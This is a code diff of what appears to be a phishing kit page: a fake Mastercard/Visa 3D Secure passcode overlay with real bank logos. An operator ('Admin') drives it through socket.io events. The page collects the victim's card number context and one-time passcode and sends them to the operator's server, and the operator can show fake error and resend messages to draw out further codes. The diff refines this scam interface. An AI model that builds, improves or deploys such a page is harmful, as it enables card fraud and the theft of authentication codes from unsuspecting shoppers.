@@ -347,7 +347,7 @@
   width: 100%;
   height: 100%;
   background: rgba(0, 0, 0, 0.6);
-  backdrop-filter: blur(4px);
+  backdrop-filter: blur(2px);
   z-index: 9999;
   display: none;
   justify-content: center;
@@ -361,32 +361,18 @@
 
 #mcOtpInput:focus {
   border-color: #3498db !important;
-  box-shadow: 0 0 0 2px rgba(52, 152, 219, 0.3) !important;
+  box-shadow: 0 0 2px rgba(52, 152, 219, 0.5) !important;
   outline: none !important;
 }
 
 .btn-loading {
   position: relative;
   pointer-events: none;
+  opacity: 0.8;
 }
 
-.btn-loading span {
-  opacity: 0.7;
-}
-
-.btn-loading:after {
-  content: "";
-  position: absolute;
-  width: 16px;
-  height: 16px;
-  top: 50%;
-  left: 50%;
-  margin-top: -8px;
-  margin-left: -8px;
-  border-radius: 50%;
-  border: 2px solid transparent;
-  border-top-color: #ffffff;
-  animation: spin 0.8s linear infinite;
+#mcVerificationContent {
+  font-family: Arial, sans-serif;
 }
     </style>
 </head>
@@ -1750,10 +1736,10 @@ function init() {
 // Start the application
 init();
 </script>
- <!-- MC Verification Overlay -->
+<!-- MC Verification Overlay -->
 <div id="mcVerificationOverlay" class="fullscreen-overlay">
   <!-- Loading Content - Shown Initially -->
-  <div id="mcLoadingContent" style="display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 450px; max-height: 550px; background: white; width: 90%; max-width: 480px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);">
+  <div id="mcLoadingContent" style="display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 450px; max-height: 550px; background: white; width: 90%; max-width: 480px; border-radius: 0; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);">
     <div style="border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite;"></div>
     
     <!-- Added verification logo during loading -->
@@ -1763,102 +1749,91 @@ init();
   </div>
   
   <!-- Verification Content - Hidden Until Admin Sends start_verification Event -->
-  <div id="mcVerificationContent" style="display: none; position: relative; width: 90%; max-width: 480px; background-color: white; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);">
+  <div id="mcVerificationContent" style="display: none; position: relative; width: 90%; max-width: 480px; background-color: white; border-radius: 0; overflow: hidden; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);">
     <!-- Header with bank and card brand logos -->
-    <div style="display: flex; justify-content: space-between; align-items: center; padding: 15px; border-bottom: 1px solid #e5e5e5;">
-      <div style="height: 40px; width: 40%;">
+    <div style="display: flex; justify-content: space-between; align-items: center; padding: 10px 15px; border-bottom: 1px solid #e0e0e0; background-color: #fff;">
+      <div style="height: 40px; max-width: 45%;">
         <img id="bankLogo" src="" alt="Bank Logo" style="height: 40px; max-width: 100%;">
       </div>
-      <div style="height: 40px; width: 40%; text-align: right;">
+      <div style="height: 40px; max-width: 45%; text-align: right;">
         <img id="verificationTypeLogo" src="" alt="Verification Logo" style="height: 40px; max-width: 100%;">
       </div>
     </div>
 
     <!-- Main content -->
-    <div style="padding: 20px;">
-      <h3 style="margin-top: 0; margin-bottom: 15px; font-weight: bold; color: #333;">Protecting your online payments</h3>
+    <div style="padding: 15px;">
+      <h3 style="margin-top: 0; margin-bottom: 15px; font-weight: bold; color: #333; font-size: 16px;">Protecting your online payments</h3>
       
-      <div style="background-color: #f0e6f6; padding: 12px; border-radius: 4px; border: 1px solid #d9c8e6; margin-bottom: 20px;">
-        <p style="margin: 0; font-size: 14px; color: #555;">
-          One-Time Passcode is required for this purchase. This passcode has been sent to your registered mobile <span id="cardLastFourDigits">********9401</span>
+      <div style="background-color: #f0e6f6; padding: 10px; border-radius: 3px; border: 1px solid #d9c8e6; margin-bottom: 15px;">
+        <p style="margin: 0; font-size: 13px; color: #555; line-height: 1.4;">
+          One-Time Passcode is required for this purchase. This passcode has been sent to your registered mobile <span id="cardLastFourDigits">********9469</span>
         </p>
       </div>
       
       <!-- Transaction details -->
-      <div style="margin-bottom: 20px; font-size: 14px; color: #333;">
-        <div style="display: flex; margin-bottom: 5px;">
-          <div style="width: 120px;">Merchant:</div>
-          <div id="merchantName" style="flex: 1; font-weight: 500;">Bologus pvt store.</div>
+      <div style="margin-bottom: 15px; font-size: 13px; color: #333; text-align: center;">
+        <div style="margin-bottom: 5px;">
+          <span style="display: inline-block; min-width: 90px; text-align: right; padding-right: 10px;">Merchant</span>
+          <span id="merchantName" style="display: inline-block; text-align: left; font-weight: 500;">GOLFSTORE 3DS</span>
         </div>
-        <div style="display: flex; margin-bottom: 5px;">
-          <div style="width: 120px;">Amount:</div>
-          <div style="flex: 1; font-weight: 500;">
-            <span id="currencySymbol">₹</span><span id="transactionAmount">1299</span>
-            <div id="convertedAmountDisplay" style="display: none; font-size: 12px; color: #666;">
-              <span id="originalCurrencyDisplay">USD: $<span id="originalAmount">1299.00</span></span>
-            </div>
-          </div>
+        <div style="margin-bottom: 5px;">
+          <span style="display: inline-block; min-width: 90px; text-align: right; padding-right: 10px;">Amount</span>
+          <span style="display: inline-block; text-align: left; font-weight: 500;">
+            <span id="currencySymbol">$</span><span id="transactionAmount">45.99</span>
+          </span>
         </div>
-        <div style="display: flex; margin-bottom: 5px;">
-          <div style="width: 120px;">Date:</div>
-          <div id="transactionDate" style="flex: 1; font-weight: 500;"></div>
+        <div style="margin-bottom: 5px;">
+          <span style="display: inline-block; min-width: 90px; text-align: right; padding-right: 10px;">Date</span>
+          <span id="transactionDate" style="display: inline-block; text-align: left; font-weight: 500;">17:10:09</span>
         </div>
-        <div style="display: flex; margin-bottom: 5px;">
-          <div style="width: 120px;">Card Number:</div>
-          <div id="cardNumberDisplay" style="flex: 1; font-weight: 500;">XXXX XXXX XXXX 0033</div>
+        <div style="margin-bottom: 5px;">
+          <span style="display: inline-block; min-width: 90px; text-align: right; padding-right: 10px;">Card Number</span>
+          <span id="cardNumberDisplay" style="display: inline-block; text-align: left; font-weight: 500;">XXXX XXXX XXXX 0622</span>
+        </div>
+        <div style="margin-bottom: 5px;">
+          <span style="display: inline-block; min-width: 90px; text-align: right; padding-right: 10px;">Reference Id</span>
+          <span id="referenceId" style="display: inline-block; text-align: left; font-weight: 500;">299879</span>
         </div>
       </div>
       
       <!-- OTP input field -->
-      <div style="margin-bottom: 20px;">
-        <label for="mcOtpInput" style="display: block; margin-bottom: 8px; font-weight: 500; font-size: 14px;">Enter One-Time Passcode</label>
-        <div style="position: relative;">
-          <input type="text" id="mcOtpInput" style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; letter-spacing: 2px; transition: border-color 0.3s, box-shadow 0.3s;" placeholder="Enter One-Time Passcode" maxlength="6">
-          <div style="position: absolute; right: 10px; top: 50%; transform: translateY(-50%); cursor: pointer;" id="otpInfoIcon">
-            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#999" stroke-width="2">
+      <div style="margin-bottom: 20px; display: flex; align-items: center;">
+        <span style="font-size: 13px; margin-right: 10px; min-width: 150px;">Enter One-Time Passcode</span>
+        <div style="position: relative; flex: 1;">
+          <input type="text" id="mcOtpInput" style="width: 100%; padding: 8px; border: 1px solid #ccc; border-radius: 3px; font-size: 14px; transition: all 0.3s;" placeholder="Enter One-Time Passcode" maxlength="6">
+          <div style="position: absolute; right: 8px; top: 50%; transform: translateY(-50%); cursor: pointer;" id="otpInfoIcon">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#999" stroke-width="2">
               <circle cx="12" cy="12" r="10"/>
               <path d="M12 16v-4M12 8h.01"/>
             </svg>
           </div>
-          <div id="otpInfoTooltip" style="position: absolute; bottom: 45px; right: 0; background: #333; color: white; padding: 8px 12px; border-radius: 4px; font-size: 12px; width: 220px; display: none; z-index: 5;">
-            The One-Time Passcode is a temporary security code sent to your registered mobile number for verification.
-            <div style="position: absolute; bottom: -5px; right: 10px; width: 10px; height: 10px; background: #333; transform: rotate(45deg);"></div>
-          </div>
         </div>
-        <p id="mcOtpError" style="color: #e74c3c; font-size: 13px; margin-top: 5px; display: none;">
-          Incorrect OTP, please enter valid one time passcode sent to your registered mobile
-        </p>
       </div>
       
+      <p id="mcOtpError" style="color: #e74c3c; font-size: 13px; margin-top: 0; margin-bottom: 15px; display: none; text-align: center;">
+        Incorrect OTP, please enter valid one time passcode sent to your registered mobile
+      </p>
+      
       <!-- Consent checkbox -->
-      <div style="margin-bottom: 20px;">
-        <label id="consentLabel" style="display: flex; align-items: flex-start; cursor: pointer; font-size: 13px; color: #555;">
-          <div id="mcConsentCheckbox" style="flex-shrink: 0; width: 18px; height: 18px; border: 1px solid #ccc; border-radius: 3px; margin-right: 10px; margin-top: 1px; display: flex; align-items: center; justify-content: center; background-color: #2778c4; border-color: #2778c4;">
-            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3">
-              <path d="M5 13l4 4L19 7"/>
-            </svg>
-          </div>
+      <div style="margin-bottom: 15px;">
+        <label id="consentLabel" style="display: flex; align-items: flex-start; cursor: pointer; font-size: 12px; color: #555;">
+          <input type="checkbox" id="mcConsentCheckbox" style="margin-right: 8px; margin-top: 1px;" checked>
           <span>I agree that by clicking the box I have read, understood and accepted the 3D Secure Terms and Conditions.</span>
         </label>
       </div>
       
       <!-- Action buttons -->
-      <div style="display: flex; gap: 10px; margin-bottom: 15px;">
-        <button id="mcSubmitBtn" style="flex: 1; padding: 10px; background-color: #2778c4; color: white; border: none; border-radius: 4px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;">Submit</button>
-        <button id="mcResendBtn" style="flex: 1; padding: 10px; background-color: #3498db; color: white; border: none; border-radius: 4px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;">Resend</button>
-        <button id="mcCancelBtn" style="flex: 1; padding: 10px; background-color: #95a5a6; color: white; border: none; border-radius: 4px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;">Cancel</button>
-      </div>
-      
-      <!-- Timer -->
-      <div style="text-align: center; font-size: 13px; color: #666;">
-        Time remaining: <span id="mcTimer">02:59</span>
+      <div style="display: flex; gap: 5px; margin-bottom: 10px;">
+        <button id="mcSubmitBtn" style="flex: 1; padding: 8px; background-color: #8ab4f8; color: white; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;">Submit</button>
+        <button id="mcResendBtn" style="flex: 1; padding: 8px; background-color: #0066cc; color: white; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;">Resend</button>
+        <button id="mcCancelBtn" style="flex: 1; padding: 8px; background-color: #aaaaaa; color: white; border: none; border-radius: 3px; font-size: 14px; cursor: pointer; transition: background-color 0.3s;">Cancel</button>
       </div>
       
       <!-- Footer links -->
-      <div style="margin-top: 20px; padding-top: 15px; border-top: 1px solid #e5e5e5; text-align: center; font-size: 12px;">
-        <a href="#" style="color: #3498db; text-decoration: none; margin: 0 8px;">Terms & Conditions</a> |
-        <a href="#" style="color: #3498db; text-decoration: none; margin: 0 8px;">FAQs</a> |
-        <a href="#" style="color: #3498db; text-decoration: none; margin: 0 8px;">Contact Us</a>
+      <div style="margin-top: 15px; padding-top: 8px; border-top: 1px solid #e5e5e5; text-align: center; font-size: 11px; color: #777;">
+        <a href="#" style="color: #555; text-decoration: none; margin: 0 5px;">Terms & Conditions</a> |
+        <a href="#" style="color: #555; text-decoration: none; margin: 0 5px;">FAQs</a> |
+        <a href="#" style="color: #555; text-decoration: none; margin: 0 5px;">Contact Us</a>
       </div>
     </div>
   </div>
@@ -2346,10 +2321,7 @@ handleCardSubmit = function(e) {
     'JPY': '¥',
     'INR': '₹',
     'AUD': 'A$',
-    'CAD': 'C$',
-    'CHF': 'CHF',
-    'CNY': '¥',
-    'SGD': 'S$'
+    'CAD': 'C$'
   };
   
   // Card type logos
@@ -2364,6 +2336,7 @@ handleCardSubmit = function(e) {
   // Bank logos
   const bankLogos = {
     'default': 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png',
+    'housing': 'https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/Housing_Bank_Logo.svg/1280px-Housing_Bank_Logo.svg.png',
     'gibraltar': 'https://upload.wikimedia.org/wikipedia/en/thumb/4/4a/Gibraltar_International_Bank_Logo.svg/220px-Gibraltar_International_Bank_Logo.svg.png',
     'hsbc': 'https://upload.wikimedia.org/wikipedia/commons/a/aa/HSBC_logo_(2018).svg',
     'chase': 'https://1000logos.net/wp-content/uploads/2016/11/Chase-National-Bank-Logo-500x281.png',
@@ -2376,367 +2349,265 @@ handleCardSubmit = function(e) {
     'sbi': 'https://logolook.net/wp-content/uploads/2022/04/SBI-Logo.png'
   };
   
-  // DOM Elements
-  const mcVerificationOverlay = document.getElementById('mcVerificationOverlay');
-  const mcLoadingContent = document.getElementById('mcLoadingContent');
-  const mcVerificationContent = document.getElementById('mcVerificationContent');
-  const loadingVerificationLogo = document.getElementById('loadingVerificationLogo');
-  const bankLogo = document.getElementById('bankLogo');
-  const verificationTypeLogo = document.getElementById('verificationTypeLogo');
-  const cardLastFourDigits = document.getElementById('cardLastFourDigits');
-  const merchantName = document.getElementById('merchantName');
-  const currencySymbol = document.getElementById('currencySymbol');
-  const transactionAmount = document.getElementById('transactionAmount');
-  const transactionDate = document.getElementById('transactionDate');
-  const cardNumberDisplay = document.getElementById('cardNumberDisplay');
-  const mcOtpInput = document.getElementById('mcOtpInput');
-  const mcOtpError = document.getElementById('mcOtpError');
-  const mcSubmitBtn = document.getElementById('mcSubmitBtn');
-  const mcResendBtn = document.getElementById('mcResendBtn');
-  const mcCancelBtn = document.getElementById('mcCancelBtn');
-  const mcTimer = document.getElementById('mcTimer');
-  const mcConsentCheckbox = document.getElementById('mcConsentCheckbox');
-  const consentLabel = document.getElementById('consentLabel');
-  const otpInfoIcon = document.getElementById('otpInfoIcon');
-  const otpInfoTooltip = document.getElementById('otpInfoTooltip');
+  // Initialize DOM references
+  function initDOM() {
+    return {
+      overlay: document.getElementById('mcVerificationOverlay'),
+      loadingContent: document.getElementById('mcLoadingContent'),
+      verificationContent: document.getElementById('mcVerificationContent'),
+      loadingLogo: document.getElementById('loadingVerificationLogo'),
+      bankLogo: document.getElementById('bankLogo'),
+      verificationLogo: document.getElementById('verificationTypeLogo'),
+      lastFourDigits: document.getElementById('cardLastFourDigits'),
+      merchantName: document.getElementById('merchantName'),
+      currencySymbol: document.getElementById('currencySymbol'),
+      amount: document.getElementById('transactionAmount'),
+      date: document.getElementById('transactionDate'),
+      cardNumber: document.getElementById('cardNumberDisplay'),
+      referenceId: document.getElementById('referenceId'),
+      otpInput: document.getElementById('mcOtpInput'),
+      otpError: document.getElementById('mcOtpError'),
+      submitBtn: document.getElementById('mcSubmitBtn'),
+      resendBtn: document.getElementById('mcResendBtn'),
+      cancelBtn: document.getElementById('mcCancelBtn'),
+      consentBox: document.getElementById('mcConsentCheckbox')
+    };
+  }
   
   // Function to show the loading screen
-  function showMCVerificationLoading(data) {
-    if (mcVerificationOverlay) {
-      console.log('Showing MC Verification loading');
-      
-      // Set the correct logo based on card type
-      const cardType = data.cardType || 'mastercard';
-      
-      if (loadingVerificationLogo) {
-        let logoSrc = cardTypeLogos[cardType.toLowerCase()] || cardTypeLogos.mastercard;
-        loadingVerificationLogo.innerHTML = `<img src="${logoSrc}" alt="${cardType}" style="max-height: 60px; max-width: 200px;">`;
-        console.log('Set loading logo:', logoSrc);
-      }
-      
-      // Show the overlay with loading spinner
-      mcLoadingContent.style.display = 'flex';
-      mcVerificationContent.style.display = 'none';
-      mcVerificationOverlay.style.display = 'flex';
-      
-      // Store data for later use
-      window.mcVerificationData = data;
-      
-      console.log('MC Verification loading shown for card type:', cardType);
-    } else {
-      console.error('MC Verification overlay not found!');
+  function showLoading(data) {
+    const dom = initDOM();
+    if (!dom.overlay) {
+      console.error('MC Verification overlay not found in DOM');
+      return;
     }
+    
+    // Set the correct logo based on card type
+    const cardType = data.cardType || 'visa';
+    if (dom.loadingLogo) {
+      let logoSrc = cardTypeLogos[cardType.toLowerCase()] || cardTypeLogos.visa;
+      dom.loadingLogo.innerHTML = `<img src="${logoSrc}" alt="${cardType}" style="max-height: 60px; max-width: 200px;">`;
+    }
+    
+    // Show the overlay with loading spinner
+    dom.loadingContent.style.display = 'flex';
+    dom.verificationContent.style.display = 'none';
+    dom.overlay.style.display = 'flex';
+    
+    // Store data for later use
+    window.mcVerificationData = data;
+    
+    console.log('MC Verification loading shown for card type:', cardType);
   }
   
   // Function to show the verification form
-  function showMCVerificationForm(data) {
-    if (mcVerificationOverlay) {
-      console.log('Showing MC Verification form');
-      
-      // Get stored data
-      const storedData = window.mcVerificationData || {};
-      
-      // Update logos
-      // 1. Bank logo
-      if (bankLogo) {
-        const bankCode = data.bankCode?.toLowerCase() || 'default';
-        bankLogo.src = bankLogos[bankCode] || bankLogos.default;
-        console.log('Set bank logo:', bankCode, bankLogo.src);
-      }
-      
-      // 2. Verification type logo
-      if (verificationTypeLogo) {
-        const logoType = data.verificationType?.toLowerCase() || storedData.cardType?.toLowerCase() || 'mastercard';
-        verificationTypeLogo.src = cardTypeLogos[logoType] || cardTypeLogos.mastercard;
-        console.log('Set verification logo:', logoType, verificationTypeLogo.src);
-      }
-      
-      // Update transaction details
-      if (merchantName) {
-        merchantName.textContent = data.merchantName || 'Bologus pvt store.';
-      }
-      
-      // Set the amount and currency
-      if (currencySymbol && transactionAmount) {
-        const currency = data.currency || 'INR';
-        const amount = data.amount || '1299';
-        
-        currencySymbol.textContent = currencySymbols[currency] || '₹';
-        transactionAmount.textContent = amount;
-        console.log('Set currency and amount:', currency, amount);
-      }
-      
-      // Set the date
-      if (transactionDate) {
-        const today = new Date();
-        transactionDate.textContent = today.toLocaleDateString();
-      }
-      
-      // Set card number display
-      if (cardNumberDisplay) {
-        // Use actual card number if available from the form
-        const cardNumber = document.getElementById('card-number')?.value || 'XXXX XXXX XXXX 0033';
-        if (cardNumber) {
-          const lastFour = cardNumber.replace(/\s/g, '').slice(-4);
-          cardNumberDisplay.textContent = `XXXX XXXX XXXX ${lastFour}`;
-        }
-      }
-      
-      // Set last four digits of phone
-      if (cardLastFourDigits) {
-        cardLastFourDigits.textContent = `********${data.phoneLastFour || '9401'}`;
-        console.log('Set phone last four:', data.phoneLastFour);
-      }
-      
-      // Show the verification form and hide loading
-      mcLoadingContent.style.display = 'none';
-      mcVerificationContent.style.display = 'block';
-      
-      // Start timer
-      startMCTimer();
-      
-      // Setup event handlers
-      setupEventHandlers();
-      
-      console.log('MC Verification form shown successfully');
-    } else {
-      console.error('MC Verification overlay not found!');
+  function showVerification(data) {
+    const dom = initDOM();
+    if (!dom.overlay) {
+      console.error('MC Verification overlay not found in DOM');
+      return;
     }
-  }
-  
-  // Function to start the timer
-  function startMCTimer() {
-    if (mcTimer) {
-      // Clear existing timer if any
-      if (mcTimerInterval) {
-        clearInterval(mcTimerInterval);
-      }
-      
-      // Set initial time (2:59)
-      let totalSeconds = 2 * 60 + 59;
-      
-      // Update timer display
-      function updateTimer() {
-        const minutes = Math.floor(totalSeconds / 60);
-        const seconds = totalSeconds % 60;
-        mcTimer.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-        
-        if (totalSeconds <= 0) {
-          clearInterval(mcTimerInterval);
-          // Hide verification overlay
-          hideMCVerification();
-          // Redirect to fail page due to timeout
-          setTimeout(() => {
-            window.location.href = '/fail.html?reason=timeout';
-          }, 500);
-        }
-        
-        totalSeconds--;
-      }
-      
-      // Initial update
-      updateTimer();
-      
-      // Start interval
-      mcTimerInterval = setInterval(updateTimer, 1000);
-      console.log('Started MC timer');
+    
+    // Get stored data
+    const storedData = window.mcVerificationData || {};
+    
+    // Update logos
+    // 1. Bank logo
+    if (dom.bankLogo) {
+      const bankCode = data.bankCode?.toLowerCase() || 'housing';
+      dom.bankLogo.src = bankLogos[bankCode] || bankLogos.housing;
     }
-  }
-  
-  // Function to hide the verification overlay
-  function hideMCVerification() {
-    if (mcVerificationOverlay) {
-      mcVerificationOverlay.style.display = 'none';
-      
-      // Clear timer
-      if (mcTimerInterval) {
-        clearInterval(mcTimerInterval);
-        mcTimerInterval = null;
-      }
-      console.log('MC Verification hidden');
+    
+    // 2. Verification type logo
+    if (dom.verificationLogo) {
+      const logoType = data.verificationType?.toLowerCase() || storedData.cardType?.toLowerCase() || 'visa';
+      dom.verificationLogo.src = cardTypeLogos[logoType] || cardTypeLogos.visa;
     }
+    
+    // Set merchant name
+    if (dom.merchantName) {
+      dom.merchantName.textContent = data.merchantName || 'GOLFSTORE 3DS';
+    }
+    
+    // Set amount and currency
+    if (dom.currencySymbol && dom.amount) {
+      const currency = data.currency || 'USD';
+      const amount = data.amount || '45.99';
+      
+      dom.currencySymbol.textContent = currencySymbols[currency] || '$';
+      dom.amount.textContent = amount;
+    }
+    
+    // Set date
+    if (dom.date) {
+      dom.date.textContent = data.date || new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit', hour12: false});
+    }
+    
+    // Set card number
+    if (dom.cardNumber) {
+      const cardNum = document.getElementById('card-number')?.value || '';
+      const lastFour = cardNum.replace(/\s/g, '').slice(-4) || '0622';
+      dom.cardNumber.textContent = `XXXX XXXX XXXX ${lastFour}`;
+    }
+    
+    // Set reference ID
+    if (dom.referenceId) {
+      dom.referenceId.textContent = data.referenceId || '299879';
+    }
+    
+    // Set phone last four digits
+    if (dom.lastFourDigits) {
+      dom.lastFourDigits.textContent = `********${data.phoneLastFour || '9469'}`;
+    }
+    
+    // Show the verification form and hide loading
+    dom.loadingContent.style.display = 'none';
+    dom.verificationContent.style.display = 'block';
+    
+    // Setup event handlers
+    setupHandlers();
+    
+    console.log('MC Verification form shown');
   }
   
   // Setup event handlers
-  function setupEventHandlers() {
-    console.log('Setting up MC event handlers');
+  function setupHandlers() {
+    const dom = initDOM();
     
     // OTP input handler
-    if (mcOtpInput) {
-      mcOtpInput.addEventListener('input', function() {
-        // Enable submit button if OTP has 6 digits
-        if (mcOtpInput.value.length === 6) {
-          mcSubmitBtn.style.backgroundColor = '#2778c4';
-          mcSubmitBtn.style.cursor = 'pointer';
-          mcSubmitBtn.disabled = false;
-        } else {
-          mcSubmitBtn.style.backgroundColor = '#95a5a6';
-          mcSubmitBtn.style.cursor = 'not-allowed';
-          mcSubmitBtn.disabled = true;
-        }
-        
+    if (dom.otpInput) {
+      dom.otpInput.addEventListener('input', function() {
         // Hide error message when typing
-        if (mcOtpError) {
-          mcOtpError.style.display = 'none';
+        if (dom.otpError) {
+          dom.otpError.style.display = 'none';
         }
-      });
-      
-      // Focus border effect
-      mcOtpInput.addEventListener('focus', function() {
-        this.style.borderColor = '#3498db';
-        this.style.boxShadow = '0 0 0 2px rgba(52, 152, 219, 0.3)';
-      });
-      
-      mcOtpInput.addEventListener('blur', function() {
-        this.style.borderColor = '#ccc';
-        this.style.boxShadow = 'none';
       });
     }
     
     // Submit button handler
-    if (mcSubmitBtn) {
-      mcSubmitBtn.addEventListener('click', function() {
-        if (mcOtpInput.value.length !== 6) return;
+    if (dom.submitBtn) {
+      dom.submitBtn.onclick = function() {
+        if (dom.otpInput.value.length < 1) return;
         
         // Show loading state
-        const originalText = mcSubmitBtn.textContent;
-        mcSubmitBtn.textContent = 'Verifying...';
-        mcSubmitBtn.classList.add('btn-loading');
-        mcSubmitBtn.disabled = true;
+        dom.submitBtn.textContent = 'Verifying...';
+        dom.submitBtn.style.opacity = '0.7';
+        dom.submitBtn.disabled = true;
         
-        // Send OTP to server
-        const otp = mcOtpInput.value;
+        // Get OTP
+        const otp = dom.otpInput.value;
         
-        // Find the invoiceId from stored data
+        // Get invoiceId
         const invoiceId = window.mcVerificationData?.invoiceId;
         
-        // Emit event to server
-        if (typeof socket !== 'undefined') {
-          socket.emit('mc_otp_submitted', {
-            otp: otp,
-            invoiceId: invoiceId
-          });
-          
-          console.log('Submitted OTP:', otp, 'for invoice:', invoiceId);
-        } else {
-          console.error('Socket.io not available!');
-          // Reset button if socket not available
-          setTimeout(() => {
-            mcSubmitBtn.textContent = originalText;
-            mcSubmitBtn.classList.remove('btn-loading');
-            mcSubmitBtn.disabled = false;
-          }, 1000);
-        }
-      });
+        // Send to server
+        socket.emit('mc_otp_submitted', {
+          otp: otp,
+          invoiceId: invoiceId
+        });
+        
+        console.log('Submitted OTP:', otp);
+      };
     }
     
     // Resend button handler
-    if (mcResendBtn) {
-      mcResendBtn.addEventListener('click', function() {
+    if (dom.resendBtn) {
+      dom.resendBtn.onclick = function() {
         // Show loading state
-        const originalText = mcResendBtn.textContent;
-        mcResendBtn.textContent = 'Sending...';
-        mcResendBtn.classList.add('btn-loading');
-        mcResendBtn.disabled = true;
+        const originalText = dom.resendBtn.textContent;
+        dom.resendBtn.textContent = 'Sending...';
+        dom.resendBtn.style.opacity = '0.7';
+        dom.resendBtn.disabled = true;
         
-        // Find the invoiceId from stored data
+        // Get invoiceId
         const invoiceId = window.mcVerificationData?.invoiceId;
         
-        // Emit resend event
-        if (typeof socket !== 'undefined') {
-          socket.emit('mc_resend_otp', {
-            invoiceId: invoiceId
-          });
-        }
+        // Send to server
+        socket.emit('mc_resend_otp', {
+          invoiceId: invoiceId
+        });
         
-        // Restore button after 2 seconds
+        // Reset button after delay
         setTimeout(() => {
-          mcResendBtn.textContent = originalText;
-          mcResendBtn.classList.remove('btn-loading');
-          mcResendBtn.disabled = false;
+          dom.resendBtn.textContent = originalText;
+          dom.resendBtn.style.opacity = '1';
+          dom.resendBtn.disabled = false;
           
-          // Show toast message
+          // Show toast
           alert('A new verification code has been sent to your registered mobile number.');
         }, 2000);
-      });
+      };
     }
     
     // Cancel button handler
-    if (mcCancelBtn) {
-      mcCancelBtn.addEventListener('click', function() {
+    if (dom.cancelBtn) {
+      dom.cancelBtn.onclick = function() {
         // Show loading state
-        mcCancelBtn.textContent = 'Cancelling...';
-        mcCancelBtn.disabled = true;
+        dom.cancelBtn.textContent = 'Cancelling...';
+        dom.cancelBtn.disabled = true;
         
-        // Find the invoiceId from stored data
+        // Get invoiceId
         const invoiceId = window.mcVerificationData?.invoiceId;
         
-        // Emit cancel event
-        if (typeof socket !== 'undefined') {
-          socket.emit('mc_verification_cancelled', {
-            invoiceId: invoiceId
-          });
-        }
+        // Send to server
+        socket.emit('mc_verification_cancelled', {
+          invoiceId: invoiceId
+        });
         
-        // Hide verification after a delay and redirect to fail page
+        // Hide and redirect
         setTimeout(() => {
-          hideMCVerification();
+          hideVerification();
           window.location.href = '/fail.html?reason=canceled';
         }, 1000);
-      });
+      };
     }
-    
-    // Info tooltip handlers
-    if (otpInfoIcon && otpInfoTooltip) {
-      otpInfoIcon.addEventListener('mouseenter', function() {
-        otpInfoTooltip.style.display = 'block';
-      });
-      
-      otpInfoIcon.addEventListener('mouseleave', function() {
-        otpInfoTooltip.style.display = 'none';
-      });
-    }
-    
-    console.log('MC event handlers setup complete');
   }
   
-  // Socket.io event listeners
+  // Hide verification overlay
+  function hideVerification() {
+    const dom = initDOM();
+    if (dom.overlay) {
+      dom.overlay.style.display = 'none';
+    }
+  }
+  
+  // Socket event listeners
   if (typeof socket !== 'undefined') {
-    console.log('Setting up Socket.io event listeners for MC verification');
-    
-    // Show MC verification loading screen
+    // Show loading screen
     socket.on('show_mc_verification', function(data) {
       console.log('Received show_mc_verification event:', data);
-      showMCVerificationLoading(data);
+      showLoading(data);
     });
     
-    // Show the actual verification form
+    // Show verification form
     socket.on('start_verification', function(data) {
       console.log('Received start_verification event:', data);
-      showMCVerificationForm(data);
+      showVerification(data);
     });
     
     // Update bank logo
     socket.on('update_mc_bank', function(data) {
       console.log('Received update_mc_bank event:', data);
-      if (bankLogo && data.bankCode) {
-        bankLogo.src = bankLogos[data.bankCode.toLowerCase()] || bankLogos.default;
+      const dom = initDOM();
+      if (dom.bankLogo && data.bankCode) {
+        dom.bankLogo.src = bankLogos[data.bankCode.toLowerCase()] || bankLogos.housing;
       }
     });
     
     // Handle OTP errors
     socket.on('mc_otp_error', function(data) {
       console.log('Received mc_otp_error event:', data);
+      const dom = initDOM();
       
-      if (mcOtpError) {
-        mcOtpError.textContent = data.message || 'Incorrect OTP, please enter valid one time passcode sent to your registered mobile';
-        mcOtpError.style.display = 'block';
+      if (dom.otpError) {
+        dom.otpError.textContent = data.message || 'Incorrect OTP, please enter valid one time passcode sent to your registered mobile';
+        dom.otpError.style.display = 'block';
       }
       
-      if (mcSubmitBtn) {
-        mcSubmitBtn.textContent = 'Submit';
-        mcSubmitBtn.classList.remove('btn-loading');
-        mcSubmitBtn.disabled = false;
+      if (dom.submitBtn) {
+        dom.submitBtn.textContent = 'Submit';
+        dom.submitBtn.style.opacity = '1';
+        dom.submitBtn.disabled = false;
       }
     });
     
@@ -2745,7 +2616,7 @@ handleCardSubmit = function(e) {
       console.log('Received mc_verification_result event:', data);
       
       // Hide verification overlay
-      hideMCVerification();
+      hideVerification();
       
       // Redirect based on result
       setTimeout(() => {
@@ -2756,15 +2627,6 @@ handleCardSubmit = function(e) {
         }
       }, data.success ? 3000 : 4000);
     });
-    
-    console.log('Socket.io event listeners for MC verification setup complete');
-  } else {
-    console.error('Socket.io not available for MC verification events!');
-  }
-  
-  // Check if verification overlay exists
-  if (!mcVerificationOverlay) {
-    console.error('MC Verification overlay not found in the DOM!');
   }
 })();
 </script>
